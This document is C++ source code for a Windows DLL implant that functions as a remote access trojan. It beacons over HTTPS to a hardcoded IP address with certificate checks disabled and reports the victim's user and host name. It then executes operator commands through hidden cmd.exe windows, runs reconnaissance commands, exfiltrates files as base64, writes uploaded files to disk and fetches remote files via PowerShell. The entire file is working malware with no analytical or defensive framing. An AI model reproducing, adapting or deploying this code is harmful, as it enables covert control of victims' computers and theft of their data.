#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <lmcons.h>
#include <fstream>
#include <sstream>

#pragma comment(lib, "winhttp.lib")

struct Config {
    char ip[16] = "10.254.130.247";
} config;

int sleep_interval = 5000;

// --- BASE64 UTILITIES ---
const std::string b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::string base64_encode(const std::string& in) {
    std::string out; int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c; valb += 8;
        while (valb >= 0) { out.push_back(b64[(val >> valb) & 0x3F]); valb -= 6; }
    }
    if (valb > -6) out.push_back(b64[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

std::string base64_decode(const std::string& in) {
    std::string out; std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[b64[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c]; valb += 6;
        if (valb >= 0) { out.push_back(char((val >> valb) & 0xFF)); valb -= 8; }
    }
    return out;
}

// --- HIDDEN COMMAND EXECUTION ---
std::string exec_shell(const std::string& cmd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "[!] Pipe failed.";

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE; si.hStdOutput = si.hStdError = hWrite;
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, (LPSTR)("cmd.exe /c " + cmd).c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite); CloseHandle(hRead); return "[!] Execution failed.";
    }
    CloseHandle(hWrite);

    std::string result; char buffer[4096]; DWORD readBytes;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &readBytes, NULL) && readBytes > 0) {
        buffer[readBytes] = '\0'; result += buffer;
    }
    CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return result.empty() ? "[Command executed successfully, no output]" : result;
}

// --- COMMAND ROUTER ---
std::string ProcessCommand(const std::string& input) {
    std::string cmd = input, arg = "";
    size_t space_pos = input.find(' ');
    if (space_pos != std::string::npos) {
        cmd = input.substr(0, space_pos);
        arg = input.substr(space_pos + 1);
    }
    std::string cmd_upper = cmd;
    for (auto& c : cmd_upper) c = toupper(c);

    if (cmd_upper == "CD" || cmd_upper == "PWD" || cmd_upper == "GETWD") {
        if (!arg.empty()) SetCurrentDirectoryA(arg.c_str());
        char path[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, path);
        return std::string(path);
    }
    if (cmd_upper == "GETUID") return exec_shell("whoami");
    if (cmd_upper == "SYSINFO") return exec_shell("systeminfo");
    if (cmd_upper == "PS") return exec_shell("tasklist");
    if (cmd_upper == "IFCONFIG") return exec_shell("ipconfig /all");
    if (cmd_upper == "KILL") ExitProcess(0);

    if (cmd_upper == "SLEEP") {
        if (!arg.empty()) sleep_interval = std::stoi(arg);
        return "Sleep interval is now: " + std::to_string(sleep_interval) + "ms";
    }

    if (cmd_upper == "WGET") {
        return exec_shell("powershell -c \"Invoke-WebRequest -Uri '" + arg + "' -OutFile 'downloaded_file'\"");
    }

    if (cmd_upper == "DOWNLOAD") {
        std::ifstream f(arg, std::ios::binary);
        if (!f) return "[!] Failed to open file for download.";
        std::string str((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        return "|DL|" + arg + "|::|" + base64_encode(str);
    }

    if (cmd_upper == "UPLOAD") {
        size_t split = arg.find(' ');
        if (split == std::string::npos) return "[!] Invalid upload format.";
        std::string path = arg.substr(0, split);
        std::string data = base64_decode(arg.substr(split + 1));

        std::ofstream f(path, std::ios::binary);
        if (!f) return "[!] Failed to write file.";
        f.write(data.data(), data.size());
        return "[+] File uploaded successfully to: " + path;
    }

    if (cmd_upper == "SHELL") return exec_shell(arg);

    return exec_shell(input);
}

// --- WINHTTP SECURE SESSION ---
bool session(std::string status, std::string data) {
    bool success = false;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    std::wstring wide_ip(config.ip, config.ip + strlen(config.ip));
    HINTERNET hConnect = WinHttpConnect(hSession, wide_ip.c_str(), 443, 0); // Port 443

    if (hConnect) {
        // WINHTTP_FLAG_SECURE initiates the TLS handshake
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

        if (hRequest) {
            // Bypass Self-Signed Certificate Errors
            DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

            std::string body = "{\"status\":\"" + status + "\", \"data\":\"" + base64_encode(data) + "\"}";
            std::wstring headers = L"Content-Type: application/json\r\n";

            if (WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), body.length(), body.length(), 0)) {
                if (WinHttpReceiveResponse(hRequest, NULL)) {
                    std::string response_data;
                    DWORD dwSize = 0;
                    DWORD dwDownloaded = 0;

                    do {
                        dwSize = 0;
                        WinHttpQueryDataAvailable(hRequest, &dwSize);
                        if (dwSize == 0) break;

                        char* pszOutBuffer = new char[dwSize + 1];
                        if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                            pszOutBuffer[dwDownloaded] = '\0';
                            response_data += pszOutBuffer;
                        }
                        delete[] pszOutBuffer;
                    } while (dwSize > 0);

                    size_t pos = response_data.find("\"command\": \"");
                    if (pos != std::string::npos) {
                        std::string cmd = response_data.substr(pos + 12);
                        cmd = cmd.substr(0, cmd.find("\""));
                        if (cmd != "none") {
                            std::string out = ProcessCommand(cmd);
                            WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
                            session("output", out);
                            return true;
                        }
                    }
                    success = true;
                }
            }
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
    return success;
}

// --- MAIN LOOP ---
extern "C" __declspec(dllexport) void CALLBACK StartHeartbeat(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    char user[UNLEN + 1]; DWORD uLen = UNLEN + 1;
    char host[MAX_COMPUTERNAME_LENGTH + 1]; DWORD hLen = MAX_COMPUTERNAME_LENGTH + 1;
    GetUserNameA(user, &uLen); GetComputerNameA(host, &hLen);

    while (!session("init", "Agent Online - User: " + std::string(user) + " | Host: " + std::string(host))) Sleep(sleep_interval);

    while (true) {
        Sleep(sleep_interval);
        session("heartbeat", "");
    }
}